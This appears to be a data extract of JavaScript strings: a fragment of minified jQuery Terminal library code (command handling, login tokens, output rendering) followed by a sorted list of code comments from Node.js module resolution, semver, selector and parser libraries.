function(t,i,o){se.pause(Ce.softPause);e.jrpc({url:n,method:r,params:[t,i],request:function(e,n){try{Ce.request.call(se,e,n,se)}catch(t){y(t,""USER"")}},response:function(e,n){try{Ce.response.call(se,e,n,se)}catch(t){y(t,""USER"")}},success:function(e){if(!e.error&&e.result){o(e.result)}else{o(null)}se.resume()},error:p})}}function v(e){if(typeof e===""string""){return e}else if(typeof e.fileName===""string""){return e.fileName+"": ""+e.message}else{return e.message}}function y(n,t){if(e.isFunction(Ce.exceptionHandler)){Ce.exceptionHandler.call(se,n,t)}else{se.exception(n,t)}}function _(){var e;if(le.prop){e=le.prop(""scrollHeight"")}else{e=le.attr(""scrollHeight"")}le.scrollTop(e)}function k(n,t){try{if(e.isFunction(t)){t(function(){})}else if(typeof t!==""string""){var r=n+"" must be string or function"";throw r}}catch(i){y(i,n.toUpperCase());return false}return true}var x=[];var T=1;function E(t,r){if(Ce.convertLinks&&!r.raw){t=t.replace(F,""[[!;;]$1]"").replace(A,""[[!;;]$1]"")}var i=e.terminal.defaults.formatters;var o,a;if(!r.raw){if(r.formatters){for(o=0;o<i.length;++o){try{if(typeof i[o]===""function""){var s=i[o](t);if(typeof s===""string""){t=s}}}catch(l){if(e.isFunction(Ce.exceptionHandler)){Ce.exceptionHandler.call(se,l,""FORMATTERS"")}else{alert(""formatting error at formatters[""+o+""]\n""+(l.stack?l.stack:l))}}}}t=e.terminal.encode(t)}x.push(T);if(!r.raw&&(t.length>he||t.match(/\n/))&&(Ce.wrap===true&&r.wrap===n||Ce.wrap===false&&r.wrap===true)){var f=r.keepWords;var c=e.terminal.split_equal(t,he,f);for(o=0,a=c.length;o<a;++o){if(c[o]===""""||c[o]===""\r""){x.push(""<span></span>"")}else if(r.raw){x.push(c[o])}else{x.push(e.terminal.format(c[o],{linksNoReferrer:Ce.linksNoReferrer}))}}}else if(!r.raw){t=e.terminal.format(t,{linksNoReferrer:Ce.linksNoReferrer});t.split(/\n/).forEach(function(e){x.push(e)})}else{x.push(t)}x.push(r.finalize)}function R(n,t){try{var r=e.extend({exec:true,raw:false,finalize:e.noop},t||{});var i=e.type(n)===""function""?n():n;i=e.type(i)===""string""?i:String(i);if(i!==""""){i=e.map(i.split(I),function(n){if(n.match(I)&&!e.terminal.is_formatting(n)){n=n.replace(/^\[\[|\]\]$/g,"""");if(r.exec){if(fe&&fe.command===n){se.error(Ae.recursiveCall)}else{e.terminal.extended_command(se,n)}}return""""}else{return n}}).join("""");if(i!==""""){E(i,r)}}}catch(o){x=[];if(e.isFunction(Ce.exceptionHandler)){Ce.exceptionHandler.call(se,o,""TERMINAL"")}else{alert(""[Internal Exception(process_line)]:""+v(o)+""\n""+o.stack)}}}function C(){Be.resize(he);var n=pe.empty().detach();var t;if(Ce.outputLimit>=0){var r;if(Ce.outputLimit===0){r=se.rows()}else{r=Ce.outputLimit}t=ue.slice(ue.length-r-1)}else{t=ue}try{x=[];e.each(t,function(e,n){R.apply(null,n)});Be.before(n);se.flush()}catch(i){if(e.isFunction(Ce.exceptionHandler)){Ce.exceptionHandler.call(se,i,""TERMINAL (redraw)"")}else{alert(""Exception in redraw\n""+i.stack)}}}function L(){if(Ce.greetings===n){se.echo(se.signature)}else if(Ce.greetings){var e=typeof Ce.greetings;if(e===""string""){se.echo(Ce.greetings)}else if(e===""function""){Ce.greetings.call(se,se.echo)}else{se.error(Ae.wrongGreetings)}}}function O(n){if(typeof n===""undefined""){n=se.get_command()}var t=Be.prompt();var r=Be.mask();switch(typeof r){case""string"":n=n.replace(/./g,r);break;case""boolean"":if(r){n=n.replace(/./g,Ce.maskChar)}else{n=e.terminal.escape_formatting(n)}break}var i={finalize:function(e){e.addClass(""command"")}};if(e.isFunction(t)){t(function(e){se.echo(e+n,i)})}else{se.echo(t+n,i)}}function P(e){var n=Z.get()[e[0]];if(!n){throw new Error(Ae.invalidTerminalId)}var t=e[1];if(ee[t]){n.import_view(ee[t])}else{te=false;var r=e[2];if(r){n.exec(r).then(function(){te=true;ee[t]=n.export_view()})}}}function j(){if(te){re=false;location.hash=""#""+JSON.stringify(ne);setTimeout(function(){re=true},100)}}var N=true;var $=[];function z(t,r,i){if(N){N=false;if(Ce.historyState||Ce.execHash&&i){if(!ee.length){se.save_state()}else{se.save_state(null)}}}function o(){if(!i){te=true;if(Ce.historyState){se.save_state(t,false)}te=f}l.resolve();if(e.isFunction(Ce.onAfterCommand)){Ce.onAfterCommand.call(se,se,t)}}try{if(e.isFunction(Ce.onBeforeCommand)){if(Ce.onBeforeCommand.call(se,se,t)===false){return}}if(!i){fe=e.terminal.split_command(t)}if(!G()){if(i&&(e.isFunction(Ce.historyFilter)&&Ce.historyFilter(t)||t.match(Ce.historyFilter))){Be.history().append(t)}}var a=De.top();if(!r&&Ce.echoCommand){O(t)}var l=new e.Deferred;var f=te;if(t.match(/^\s*login\s*$/)&&se.token(true)){if(se.level()>1){se.logout(true)}else{se.logout()}o()}else if(Ce.exit&&t.match(/^\s*exit\s*$/)&&!ke){var c=se.level();if(c===1&&se.get_token()||c>1){if(se.get_token(true)){se.set_token(n,true)}se.pop()}o()}else if(Ce.clear&&t.match(/^\s*clear\s*$/)&&!ke){se.clear();o()}else{var u=ue.length-1;var p=a.interpreter.call(se,t,se);if(p!==n){se.pause(Ce.softPause);return e.when(p).then(function(e){if(e&&u===ue.length-1){s(e)}o();se.resume()})}else if(Oe){$.push(function(){o()})}else{o()}}return l.promise()}catch(m){y(m,""USER"");se.resume();throw m}}function H(){if(e.isFunction(Ce.onBeforeLogout)){try{if(Ce.onBeforeLogout.call(se,se)===false){return}}catch(n){y(n,""onBeforeLogout"")}}D();if(e.isFunction(Ce.onAfterLogout)){try{Ce.onAfterLogout.call(se,se)}catch(n){y(n,""onAfterlogout"")}}se.login(Ce.login,true,J)}function D(){var e=se.prefix_name(true)+""_"";Se.remove(e+""token"");Se.remove(e+""login"")}function B(n){var t=se.prefix_name()+""_interpreters"";var r=Se.get(t);if(r){r=e.parseJSON(r)}else{r=[]}if(e.inArray(n,r)===-1){r.push(n);Se.set(t,JSON.stringify(r))}}function K(n){var t=De.top();var r=se.prefix_name(true);if(!G()){B(r)}Be.name(r);if(e.isFunction(t.prompt)){Be.prompt(function(e){t.prompt.call(se,e,se)})}else{Be.prompt(t.prompt)}if(e.isPlainObject(t.keymap)){Be.keymap(e.omap(t.keymap,function(e,n){return function(){var e=[].slice.call(arguments);try{return n.apply(se,e)}catch(t){y(t,""USER KEYMAP"");throw t}}}))}Be.set("""");_e.resolve();if(!n&&e.isFunction(t.onStart)){t.onStart.call(se,se)}}function q(){if(re&&Ce.execHash){try{if(location.hash){var n=location.hash.replace(/^#/,"""");ne=e.parseJSON(decodeURIComponent(n))}else{ne=[]}if(ne.length){P(ne[ne.length-1])}else if(ee[0]){se.import_view(ee[0])}}catch(t){y(t,""TERMINAL"")}}}function J(){K();L();if(ue.length){C()}var n=false;if(e.isFunction(Ce.onInit)){xe=function(){n=true};try{Ce.onInit.call(se,se)}catch(t){y(t,""OnInit"")}finally{xe=e.noop;if(!n&&se.enabled()){se.resume()}}}if(ie){ie=false;e(window).on(""hashchange"",q)}}function G(){return ke||Be.mask()!==false}function Y(t){var r,i=De.top();if(e.isFunction(i.keydown)){r=i.keydown.call(se,t,se);if(r!==n){return r}}else if(e.isFunction(Ce.keydown)){r=Ce.keydown.call(se,t,se);if(r!==n){return r}}}var X={""CTRL+D"":function(e,t){if(!ke){if(Be.get()===""""){if(De.size()>1||Ce.login!==n){se.pop("""")}else{se.resume();se.echo("""")}}else{t()}}return false},""CTRL+L"":function(){se.clear()},TAB:function(t,r){var i=De.top(),o;if(Ce.completion&&e.type(Ce.completion)!==""boolean""&&i.completion===n){o=Ce.completion}else{o=i.completion}if(o===""settings""){o=Ce.completion}if(o){switch(e.type(o)){case""function"":var a=se.before_cursor(Ce.wordAutocomplete);if(o.length===3){var s=new Error(Ae.comletionParameters);y(s,""USER"");return false}o.call(se,a,function(e){se.complete(e,{echo:true})});break;case""array"":se.complete(o,{echo:true});break;default:throw new Error(Ae.invalidCompletion)}}else{r()}return false},""CTRL+V"":function(e,n){n(e);se.oneTime(200,function(){_()});return true},""CTRL+TAB"":function(){if(Z.length()>1){se.focus(false);return false}},PAGEDOWN:function(){se.scroll(se.height())},PAGEUP:function(){se.scroll(-se.height())}};function oe(t){var r,i;if(se.enabled()){if(!se.paused()){r=Y(t);if(r!==n){return r}if(t.which!==9){ce=0}se.attr({scrollTop:se.attr(""scrollHeight"")})}else{if(!Ce.pauseEvents){r=Y(t);if(r!==n){return r}}if(t.which===68&&t.ctrlKey){if(Ce.pauseEvents){r=Y(t);if(r!==n){return r}}if(Q.length){for(i=Q.length;i--;){var o=Q[i];if(o.readyState!==4){try{o.abort()}catch(a){if(e.isFunction(Ce.exceptionHandler)){Ce.exceptionHandler.call(se,t,""AJAX ABORT"")}else{se.error(Ae.ajaxAbortError)}}}}Q=[]}se.resume();return false}}}}function ae(e){return function(n){if(e.state()!==""resolved""){e.then(n.bind(se))}else{n.call(se)}}}var se=this;if(this.length>1){return this.each(function(){e.fn.terminal.call(e(this),t,e.extend({name:se.selector},i))})}if(se.data(""terminal"")){return se.data(""terminal"")}if(se.length===0){throw sprintf(e.terminal.defaults.strings.invalidSelector,se.selector)}var le;var fe;var ce=0;var ue=[];var pe;var me=Z.length();var he;var de;var ge;var ve=new d;var ye=e.Deferred();var _e=e.Deferred();var we=ae(_e);var be=ae(ye);var ke=false;var xe=e.noop;var Te,Ee;var Re=[];var Ce=e.extend({},e.terminal.defaults,{name:se.selector},i||{});var Se=new o(Ce.memory);var Ae=e.extend({},e.terminal.defaults.strings,Ce.strings);var Fe=Ce.enabled,Le=false;var Oe=false;var Pe=true;e.extend(se,e.omap({id:function(){return me},clear:function(){pe.html("""");ue=[];try{Ce.onClear.call(se,se)}catch(e){y(e,""onClear"")}se.attr({scrollTop:0});return se},export_view:function(){var n={};if(e.isFunction(Ce.onExport)){try{n=Ce.onExport.call(se)}catch(t){y(t,""onExport"")}}return e.extend({},{focus:Fe,mask:Be.mask(),prompt:se.get_prompt(),command:se.get_command(),position:Be.position(),lines:r(ue),interpreters:De.clone(),history:Be.history().data},n)},import_view:function(n){if(ke){throw new Error(sprintf(Ae.notWhileLogin,""import_view""))}if(e.isFunction(Ce.onImport)){try{Ce.onImport.call(se,n)}catch(t){y(t,""onImport"")}}we(function i(){se.set_prompt(n.prompt);se.set_command(n.command);Be.position(n.position);Be.mask(n.mask);if(n.focus){se.focus()}ue=r(n.lines);De=n.interpreters;if(Ce.importHistory){Be.history().set(n.history)}C()});return se},save_state:function(t,r,i){if(typeof i!==""undefined""){ee[i]=se.export_view()}else{ee.push(se.export_view())}if(!e.isArray(ne)){ne=[]}if(t!==n&&!r){var o=[me,ee.length-1,t];ne.push(o);j()}},exec:function(n,t,r){var i=r||new e.Deferred;be(function o(){if(e.isArray(n)){(function r(){var e=n.shift();if(e){se.exec(e,t).then(r)}else{i.resolve()}})()}else if(Oe){Re.push([n,t,i])}else{z(n,t,true).then(function(){i.resolve(se)})}});return i.promise()},autologin:function(e,n,t){se.trigger(""terminal.autologin"",[e,n,t]);return se},login:function(t,r,i,o){ve.push([].slice.call(arguments));if(ke){throw new Error(sprintf(Ae.notWhileLogin,""login""))}if(!e.isFunction(t)){throw new Error(Ae.loginIsNotAFunction)}ke=true;if(se.token()&&se.level()===1&&!Pe){ke=false;se.logout(true)}else if(se.token(true)&&se.login_name(true)){ke=false;if(e.isFunction(i)){i()}return se}if(Ce.history){Be.history().disable()}var a=se.level();function s(t,s,l){if(s){while(se.level()>a){se.pop(n,true)}if(Ce.history){Be.history().enable()}var f=se.prefix_name(true)+""_"";Se.set(f+""token"",s);Se.set(f+""login"",t);ke=false;if(e.isFunction(i)){i()}}else{if(r){if(!l){se.error(Ae.wrongPasswordTryAgain)}se.pop(n,true).set_mask(false)}else{ke=false;if(!l){se.error(Ae.wrongPassword)}se.pop(n,true).pop(n,true)}if(e.isFunction(o)){o()}}se.off(""terminal.autologin"")}se.on(""terminal.autologin"",function(e,n,t,r){s(n,t,r)});se.push(function(e){se.set_mask(Ce.maskChar).push(function(n){try{t.call(se,e,n,function(n,t){s(e,n,t)})}catch(r){y(r,""AUTH"")}},{prompt:Ae.password+"": "",name:""password""})},{prompt:Ae.login+"": "",name:""login""});return se},settings:function(){return Ce},before_cursor:function(e){var n=Be.position();var t=Be.get().substring(0,n);var r=t.split("" "");var i;if(e){if(r.length===1){i=r[0]}else{var o=t.match(/(\\?"")/g);var a=o?o.filter(function(e){return!e.match(/^\\/)}).length:0;o=t.match(/'/g);var s=o?o.length:0;if(s%2===1){i=t.match(/('[^']*)$/)[0]}else if(a%2===1){i=t.match(/(""(?:[^""]|\\"")*)$/)[0]}else{i=r[r.length-1];for(ze=r.length-1;ze>0;ze--){var l=r[ze-1];if(l[l.length-1]===""\\""){i=r[ze-1]+"" ""+i}else{break}}}}}else{i=t}return i},complete:function(n,t){t=e.extend({word:true,echo:false},t||{});var r=se.before_cursor(t.word).replace(/\\""/g,'""');var i=false;if(r.match(/^""/)){i='""'}else if(r.match(/^'/)){i=""'""}if(i){r=r.replace(/^[""']/,"""")}n=n.slice();if(Ce.clear&&e.inArray(""clear"",n)===-1){n.push(""clear"")}if(Ce.exit&&e.inArray(""exit"",n)===-1){n.push(""exit"")}if(ce%2===0){ge=se.before_cursor(t.word)}else{var o=se.before_cursor(t.word);if(o!==ge){return}}var a=e.terminal.escape_regex(r).replace(/\\([""'() ])/g,""\\?$1"");var s=new RegExp(""^""+a);var l=[];for(var f=n.length;f--;){if(s.test(n[f])){var c=n[f];if(i==='""'){c=c.replace(/""/g,'\\""')}if(!i){c=c.replace(/([""'() ])/g,""\\$1"")}l.push(c)}}if(l.length===1){se.insert(l[0].replace(s,"""")+(i||""""));ge=se.before_cursor(t.word);return true}else if(l.length>1){if(++ce>=2){ce=0;if(t.echo){O();var u=l.reverse().join("" "");se.echo(e.terminal.escape_brackets(u),{keepWords:true});return true}}else{var p=false;var m;e:for(m=r.length;m<l[0].length;++m){for(f=1;f<l.length;++f){if(l[0].charAt(m)!==l[f].charAt(m)){break e}}p=true}if(p){se.insert(l[0].slice(0,m).replace(s,""""));ge=se.before_cursor(t.word);return true}}}},commands:function(){return De.top().interpreter},set_interpreter:function(n,t){function r(){se.pause(Ce.softPause);h(n,!!t,function(n){se.resume();var t=De.top();e.extend(t,n);K(true)})}if(e.type(n)===""string""&&t){se.login(g(n,t),true,r)}else{r()}return se},greetings:function(){L();return se},paused:function(){return Oe},pause:function(n){be(function t(){xe();Oe=true;Be.disable();if(!n){Be.hidden()}if(e.isFunction(Ce.onPause)){Ce.onPause.call(se)}});return se},resume:function(){be(function n(){Oe=false;if(Z.front()===se){Be.enable()}Be.visible();var n=Re;Re=[];for(var t=0;t<n.length;++t){se.exec.apply(se,n[t])}se.trigger(""resume"");var r=$.shift();if(r){r()}_();if(e.isFunction(Ce.onResume)){Ce.onResume.call(se)}});return se},cols:function(){return Ce.numChars?Ce.numChars:M(se)},rows:function(){return Ce.numRows?Ce.numRows:W(se)},history:function(){return Be.history()},history_state:function(e){function n(){Ce.historyState=true;if(!ee.length){se.save_state()}else if(Z.length()>1){se.save_state(null)}}if(e){if(typeof window.setImmediate===""undefined""){setTimeout(n,0)}else{setImmediate(n)}}else{Ce.historyState=false}return se},clear_history_state:function(){ne=[];ee=[];return se},next:function(){if(Z.length()===1){return se}else{Z.front().disable();var n=Z.rotate().enable();var t=n.offset().top-50;e(""html,body"").animate({scrollTop:t},500);try{Ce.onTerminalChange.call(n,n)}catch(r){y(r,""onTerminalChange"")}return n}},focus:function(e,n){be(function t(){var t;if(Z.length()===1){if(e===false){try{t=Ce.onBlur.call(se,se);if(!n&&t!==false||n){se.disable()}}catch(r){y(r,""onBlur"")}}else{try{t=Ce.onFocus.call(se,se);if(!n&&t!==false||n){se.enable()}}catch(r){y(r,""onFocus"")}}}else if(e===false){se.next()}else{var i=Z.front();if(i!==se){i.disable();if(!n){try{Ce.onTerminalChange.call(se,se)}catch(r){y(r,""onTerminalChange"")}}}Z.set(se);se.enable()}});return se},freeze:function(e){we(function n(){if(e){se.disable();Le=true}else{Le=false;se.enable()}})},frozen:function(){return Le},enable:function(){if(!Fe&&!Le){if(he===n){se.resize()}be(function e(){if(!se.paused()){Be.enable()}Fe=true})}return se},disable:function(){be(function e(){Fe=false;Be.disable()});return se},enabled:function(){return Fe},signature:function(){var e=se.cols();var n;if(e<15){n=null}else if(e<35){n=0}else if(e<55){n=1}else if(e<64){n=2}else if(e<75){n=3}else{n=4}if(n!==null){return V[n].join(""\n"")+""\n""}else{return""""}},version:function(){return e.terminal.version},cmd:function(){return Be},get_command:function(){return Be.get()},set_command:function(e){we(function n(){Be.set(e)});return se},insert:function(e,n){if(typeof e===""string""){we(function t(){var t=se.is_bottom();Be.insert(e,n);if(Ce.scrollOnEcho||t){_()}});return se}else{throw new Error(sprintf(Ae.notAString,""insert""))}},set_prompt:function(n){we(function t(){if(k(""prompt"",n)){if(e.isFunction(n)){Be.prompt(function(e){n(e,se)})}else{Be.prompt(n)}De.top().prompt=n}});return se},get_prompt:function(){return De.top().prompt},set_mask:function(e){we(function n(){Be.mask(e===true?Ce.maskChar:e)});return se},get_output:function(n){if(n){return ue}else{return e.map(ue,function(n){return e.isFunction(n[0])?n[0]():n[0]}).join(""\n"")}},resize:function(n,t){if(!se.is("":visible"")){se.stopTime(""resize"");se.oneTime(500,""resize"",function(){se.resize(n,t)})}else{if(n&&t){se.width(n);se.height(t)}n=se.width();t=se.height();var r=se.cols();var i=se.rows();if(r!==he||i!==de){he=r;de=i;C();var o=De.top();if(e.isFunction(o.resize)){o.resize(se)}else if(e.isFunction(Ce.onResize)){Ce.onResize.call(se,se)}_()}}return se},flush:function(){try{var n=se.is_bottom();var t;e.each(x,function(n,r){if(r===T){t=e(""<div></div>"")}else if(e.isFunction(r)){t.appendTo(pe);try{r(t)}catch(i){y(i,""USER:echo(finalize)"")}}else{e(""<div/>"").html(r).appendTo(t).width(""100%"")}});if(Ce.outputLimit>=0){var r;if(Ce.outputLimit===0){r=se.rows()}else{r=Ce.outputLimit}var i=pe.find(""div div"");if(i.length>r){var o=i.length-r+1;var a=i.slice(0,o);var s=a.parent();a.remove();s.each(function(){var n=e(this);if(n.is("":empty"")){n.remove()}})}}de=W(se);if(Ce.scrollOnEcho||n){_()}x=[]}catch(l){if(e.isFunction(Ce.exceptionHandler)){Ce.exceptionHandler.call(se,l,""TERMINAL (Flush)"")}else{alert(""[Flush] ""+v(l)+""\n""+l.stack)}}return se},update:function(e,n){we(function t(){if(e<0){e=ue.length+e}if(!ue[e]){se.error(""Invalid line number ""+e)}else{if(n===null){ue.splice(e,1)}else{ue[e][0]=n}C()}});return se},last_index:function(){return ue.length-1},echo:function(n,t){function r(n){try{var r=e.extend({flush:true,raw:Ce.raw,finalize:e.noop,keepWords:false,formatters:true},t||{});if(r.flush){if(x.length){se.flush()}x=[]}R(n,r);ue.push([n,e.extend(r,{exec:false})]);if(r.flush){se.flush()}}catch(i){if(e.isFunction(Ce.exceptionHandler)){Ce.exceptionHandler.call(se,i,""TERMINAL (echo)"")}else{alert(""[Terminal.echo] ""+v(i)+""\n""+i.stack)}}}n=n||"""";var i=e.type(n);if(i===""function""||i===""string""){r(n)}else{e.when(n).then(r)}return se},error:function(n,t){t=e.extend({},t,{raw:false,formatters:false});var r=e.terminal.escape_brackets(n).replace(/\\$/,""&#92;"").replace(S,""]$1[[;;;error]"");return se.echo(""[[;;;error]""+r+""]"",t)},exception:function(n,t){var r=v(n);if(t){r=""&#91;""+t+""&#93;: ""+r}if(r){se.error(r,{finalize:function(e){e.addClass(""exception message"")},keepWords:true})}if(typeof n.fileName===""string""){se.pause(Ce.softPause);e.get(n.fileName,function(e){var t=n.lineNumber-1;var r=e.split(""\n"")[t];if(r){se.error(""[""+n.lineNumber+""]: ""+r)}se.resume()},""text"")}if(n.stack){var i=e.terminal.escape_brackets(n.stack);se.echo(i.split(/\n/g).map(function(e){return""[[;;;error]""+e.replace(S,function(e){return""]""+e+""[[;;;error]""})+""]""}).join(""\n""),{finalize:function(e){e.addClass(""exception stack-trace"")},formatters:false})}},scroll:function(e){var n;e=Math.round(e);if(le.prop){if(e>le.prop(""scrollTop"")&&e>0){le.prop(""scrollTop"",0)}n=le.prop(""scrollTop"");le.scrollTop(n+e)}else{if(e>le.attr(""scrollTop"")&&e>0){le.attr(""scrollTop"",0)}n=le.attr(""scrollTop"");le.scrollTop(n+e)}return se},logout:function(e){if(ke){throw new Error(sprintf(Ae.notWhileLogin,""logout""))}we(function t(){if(e){var t=ve.pop();se.set_token(n,true);se.login.apply(se,t)}else if(De.size()===1&&se.token()){se.logout(true)}else{while(De.size()>1){if(se.token()){se.logout(true).pop().pop()}else{se.pop()}}}});return se},token:function(e){return Se.get(se.prefix_name(e)+""_token"")},set_token:function(e,n){var t=se.prefix_name(n)+""_token"";if(typeof e===""undefined""){Se.remove(t,e)}else{Se.set(t,e)}return se},get_token:function(e){return se.token(e)},login_name:function(e){return Se.get(se.prefix_name(e)+""_login"")},name:function(){return De.top().name},prefix_name:function(e){var n=(Ce.name?Ce.name+""_"":"""")+me;if(e&&De.size()>1){var t=De.map(function(e){return e.name||""""}).slice(1).join(""_"");if(t){n+=""_""+t}}return n},read:function(n,t){var r=new e.Deferred;se.push(function(n){se.pop();if(e.isFunction(t)){t(n)}r.resolve(n)},{prompt:n});return r.promise()},push:function(t,r){be(function i(){r=r||{};var i={infiniteLogin:false};var o=e.extend({},i,r);if(!o.name&&fe){o.name=fe.name}if(o.prompt===n){o.prompt=(o.name||"">"")+"" ""}var a=De.top();if(a){a.mask=Be.mask()}var s=Oe;function l(){Ce.onPush.call(se,a,De.top(),se);K()}h(t,!!r.login,function(n){De.push(e.extend({},n,o));if(o.completion===true){if(e.isArray(n.completion)){De.top().completion=n.completion}else if(!n.completion){De.top().completion=false}}if(o.login){var r;var i=e.type(o.login);if(i===""function""){r=o.infiniteLogin?e.noop:se.pop;"
"// // But if the host to be proxied is listed in NO_PROXY, then the request is"
"// // Example, if there is a proxy server at 10.0.0.1:1234, then setting the"
"// //, !=, <=, >= before individual ones."
"// 0 params, expression."
"// 0-128, 1980-2108"
"// 0-29, 0-58 (even numbers)"
"// 0-fill the header section, it might not hit every field"
"// 00 00 FE FF  UTF-32, big-endian BOM"
"// 00 00 FF FE  UCS-4, unusual octet order BOM (2143)"
"// 0xa0 is illegal in sjis encoding, but some pages does"
"// 0xff for negative, and 0x80 for positive."
"// 1 param, no-parens, expression, no this."
"// 1 param, parens, expression, as argument, no this."
"// 1) A word longer than 1 letter, ending with a final letter. This is an"
"// 1) For the element inside the iframe without offsetParent, this method will return"
"// 1-12, 0-11"
"// 1.  First, the name and value of each parameter are encoded"
"// 1. Assert: keyA ends with ""/"" or contains only a single ""*""."
"// 1. Assert: specifier begins with ""#""."
"// 1. Assume it's a file.  unlink it, then do the dir stuff on EPERM or EISDIR"
"// 1. Copy private data: events, handlers, etc."
"// 1. Expected ReactClass methods (in the ""interface"")."
"// 1. If X is a file, load X as its file extension format. STOP"
"// 1. If X/index.js is a file, load X/index.js as JavaScript text. STOP"
"// 1. If X/package.json is a file,"
"// 1. If exports is an Object with both a key starting with ""."" and a key not starting with ""."", throw an Invalid Package Configuration error."
"// 1. If internal is true and target does not start with ""../"" or ""/"" and is not a valid URL, then"
"// 1. If matchKey is a key of matchObj and does not contain ""*"", then"
"// 1. If p equals ""default"" or conditions contains an entry for p, then"
"// 1. If pjson.main is a string, then"
"// 1. If target is a String, then"
"// 1. It is not flowing, as the flow mechanism will take"
"// 1. Let patternTrailer be the substring of expansionKey from the index after the first ""*"" character."
"// 1. Let resolved be the result of PACKAGE_TARGET_RESOLVE( packageURL, targetValue, subpath, pattern, internal, conditions),"
"// 1. Return PACKAGE_RESOLVE(target with every instance of ""*"" replaced by subpath, packageURL + ""/"")."
"// 1. Return the URL resolution of resolvedTarget with every instance of ""*"" replaced with subpath."
"// 1. Return the result of PACKAGE_EXPORTS_RESOLVE(packageURL, packageSubpath, pjson.exports, defaultConditions)."
"// 1. let { RESOLVED, EXACT } = MATCH"
"// 1.2.0-beta.1 bumps to 1.2.0-beta.2,"
"// 10. If selfUrl is not undefined, return selfUrl."
"// 10. If the length of keyB is greater than the length of keyA, return 1."
"// 11. While parentURL is not the file system root,"
"// 11.3.1, 11.3.2"
"// 11.4.4, 11.4.5"
"// 12.4 '{', 'function', 'class' is not allowed in this position."
"// 16 - Offset of start of central directory, relative to start of archive"
"// 1kb of data being output.  In this case, you could write a very small"
"// 2 params, block, as argument, nested."
"// 2) A word longer than 1 letter, ending with a Non-Final letter. In normal"
"// 2.  The parameters are sorted by name, using ascending byte value"
"// 2. Assert: keyB ends with ""/"" or contains only a single ""*""."
"// 2. Assume it's a directory.  readdir, then do the file stuff on ENOTDIR"
"// 2. If X does not match this pattern or DIR/NAME/package.json is not a file,"
"// 2. If X.js is a file, load X.js as JavaScript text. STOP"
"// 2. If X/index.json is a file, parse X/index.json to a JavaScript object. STOP"
"// 2. If no scope was found, return."
"// 2. If packageSpecifier is an empty string, then"
"// 2. If patternTrailer has zero length, or if matchKey ends with patternTrailer and the length of matchKey is greater than or"
"// 2. If resolved is undefined, continue the loop."
"// 2. If specifier is exactly equal to ""#"" or starts with ""#/"", then"
"// 2. If subpath is equal to ""."", then"
"// 2. Let expansionKeys be the list of keys of matchObj containing only a single ""*"","
"// 2. Otherwise, if target is a non-null Object, then"
"// 3) A word longer than 1 letter, starting with a final letter. Final letters"
"// 3) For body or html element, i.e. in case of the html node - it will return itself"
"// 3. For each key expansionKey in expansionKeys, do"
"// 3. If EXACT is true,"
"// 3. If X.json is a file, parse X.json to a JavaScript Object. STOP"
"// 3. If X/index.node is a file, load X/index.node as binary addon. STOP"
"// 3. If packageSpecifier is a Node.js builtin module name, then"
"// 3. If the SCOPE/package.json ""exports"" is null or undefined, return."
"// 3. If the SCOPE/package.json ""imports"" is null or undefined, return."
"// 3. It is below the highWaterMark, so we can schedule"
"// 3. Let baseLengthA be the index of ""*"" in keyA plus one, if keyA contains ""*"", or the length of keyA otherwise."
"// 3. Otherwise, if exports is an Object and all keys of exports start with ""."", then"
"// 3. Otherwise, if target is an Array, then"
"// 3. Parse DIR/NAME/package.json, and look for ""exports"" field."
"// 3.2  Drives, drive letters, mount points, file system root"
"// 4 cases: 1 (nth) x 4 (child, of-type, last-child, last-of-type)"
"// 4 combinators F E, F>E, F+E, F~E"
"// 4. If ""exports"" is null or undefined, return."
"// 4. If X.node is a file, load X.node as binary addon. STOP"
"// 4. If packageSpecifier does not start with ""@"", then"
"// 4. If packageURL is not null, then"
"// 4. If the SCOPE/package.json ""name"" is not the first segment of X, return."
"// 4. Let baseLengthB be the index of ""*"" in keyB plus one, if keyB contains ""*"", or the length of keyB otherwise."
"// 4. Otherwise, if EXACT is false,"
"// 4. Otherwise, if target is null, return null."
"// 4. let MATCH = PACKAGE_IMPORTS_RESOLVE(X, pathToFileURL(SCOPE),"
"// 4. while I >= 0,"
"// 5 seconds have passed, n = 5"
"// 5. If baseLengthA is greater than baseLengthB, return -1."
"// 5. LOAD_PACKAGE_SELF(X, dirname(Y))"
"// 5. Otherwise,"
"// 5. THROW ""not found"""
"// 5. let MATCH = PACKAGE_EXPORTS_RESOLVE(pathToFileURL(DIR/NAME), ""."" + SUBPATH,"
"// 5. let MATCH = PACKAGE_EXPORTS_RESOLVE(pathToFileURL(SCOPE),"
"// 512, 256"
"// 6 cases: 3 (first, last, only) x 1 (child) x 2 (-of-type)"
"// 6. If baseLengthB is greater than baseLengthA, return 1."
"// 6. If packageName starts with ""."" or contains ""\"" or ""%"", then"
"// 6. LOAD_NODE_MODULES(X, dirname(Y))"
"// 7. If keyA does not contain ""*"", return 1."
"// 7. Let packageSubpath be ""."" concatenated with the substring of packageSpecifier from the position at the length of packageName."
"// 7. THROW ""not found"""
"// 7.1. All identical values are equivalent, as determined by ===."
"// 7.3. Other pairs that do not both pass typeof value == 'object',"
"// 7.4. For all other Object pairs, including Array objects, equivalence is"
"// 8. If keyB does not contain ""*"", return -1."
"// 8. If packageSubpath ends in ""/"", then"
"// 8.8.8.8:53 is ""Google Public DNS"":"
"// 9. If the length of keyA is greater than the length of keyB, return -1."
"// 9. Let selfUrl be the result of PACKAGE_SELF_RESOLVE(packageName, packageSubpath, parentURL)."
"// :checkbox, :file, :image, :password, :radio, :reset, :submit, :text"
"// :empty is negated by element (1) or content nodes (text: 3; cdata: 4; entity ref: 5),"
"// :first-child, :last-child, :only-child,"
"// :first-of-type, :last-of-type, :only-of-type,"
"// :nth-child(), :nth-last-child(), :nth-of-type(), :nth-last-of-type()"
"// :root, :empty,"
"// <!BLARG foo ""bar"
"// <!DOCTYPE ""//blah"
"// <!DOCTYPE ""//blah"" [ ""foo"
"// <!DOCTYPE ""//blah"" [ ..."
"// <=0.7.x is actually <0.8.0, since any 0.7.x should"
"// <=IE7 stringifies to [Object Error]. Since it can be overloaded, we"
"// <?hi ""there"" ?"
"// <a foo=""bar"
"// <a foo=""bar"""
"// <a><b></c></b></a> will close everything, otherwise."
"// <foo bar=""&quot;"""
"// <reference types=""node"" />"
"// <x ""xmlns""=""http://foo"">"
"// ==== End of 'Serialization, deserialization' ==== //"
"// ==> AssertionError: {""body"":[],""type"":""BlockStatement"",""loc"":null} does not match type string"
"// ==> AssertionError: {""type"":""ThisExpression"",""loc"":null} does not match type Program"
"// => ""BadRequest"""
"// => '1,2,3'"
"// => '<p>fred, barney, &amp; pebbles</p>'"
"// => 'fred, barney, & pebbles'"
